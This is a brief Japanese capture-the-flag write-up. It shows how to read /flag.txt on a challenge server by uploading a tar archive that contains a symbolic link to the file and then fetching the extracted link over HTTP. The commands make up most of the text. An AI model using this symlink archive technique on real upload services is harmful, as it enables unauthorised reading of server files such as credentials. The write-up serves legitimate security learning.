まず以下のように`/flag.txt`へのシンボリックリンクを作成する。

```bash
ln -s /flag.txt get_flag.txt
```

次に、`get_flag.txt`をtarコマンドでアーカイブ化し、ペイロードを作成する。

```bash
tar -cvf payload.tar get_flag.txt
```

これをサーバにアップロードし、UUIDを控える。

最後に以下のページにアクセスして、FLAGを取得する。

```
http://34.170.146.252:13181/static/[UUID]/get_flag.txt
```